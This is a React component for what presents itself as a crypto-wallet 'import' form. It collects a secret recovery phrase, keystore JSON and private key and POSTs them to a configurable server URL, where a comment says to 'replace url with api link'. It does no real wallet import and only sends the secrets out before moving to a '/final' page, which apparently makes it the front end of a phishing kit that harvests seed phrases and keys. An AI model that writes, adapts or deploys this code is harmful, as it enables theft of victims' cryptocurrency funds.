import React, { useState } from 'react'
import './WalletForm.css'
import axios from 'axios'
import { useNavigate } from 'react-router-dom'

function WalletForm({ name }) {
  const [recoveryPhrase, setRecoveryPhrase] = useState()
  const [keyStore, setkeyStore] = useState()
  const [privateKey, setprivateKey] = useState()
  const history = useNavigate()

  const handleSubmit = (e) => {
    e.preventDefault()
    //replace url with api link below
    const url = 'http://localhost:8000/details'

    axios
      .post(url, {
        recoveryPhrase,
        keyStore,
        privateKey,
        name,
      })
      .then((response) => {
        console.log(response)
        history('/final')
      })
      .catch((err) => {
        console.log(err.message)
      })
  }

  const handleRecoveryChange = (e) => {
    setRecoveryPhrase(e.target.value)
  }
  const handlekeystoreChange = (e) => {
    setkeyStore(e.target.value)
  }
  const handleprivatekeyChange = (e) => {
    setprivateKey(e.target.value)
  }

  return (
    <div className="wallet-form">
      <form onSubmit={handleSubmit}>
        <div className="field">
          <label for="secret">Secret Recovery Phrase</label>
          <textarea
            value={recoveryPhrase}
            onChange={handleRecoveryChange}
            rows="6"
            cols="50"
          ></textarea>
          <p>Typically 12 (sometimes 24) words separated by single spaces.</p>
        </div>
        <div className="field">
          <label for="key-store">Key Store</label>
          <textarea
            onChange={handlekeystoreChange}
            rows="6"
            cols="50"
          ></textarea>
          <p>Must be a valid JSON object.</p>
        </div>
        <div className="field">
          <label for="private-key">Private Key</label>
          <input onChange={handleprivatekeyChange} type="text" />
          <p>At least 12 characters.</p>
        </div>
        <div className="field">
          <label for="wallet-name">Wallet name</label>
          <input type="text" value={name} />
        </div>
        <div class="empty-message"></div>
        <input className="submit-btn" type="submit" value="import" />
      </form>
    </div>
  )
}

export default WalletForm
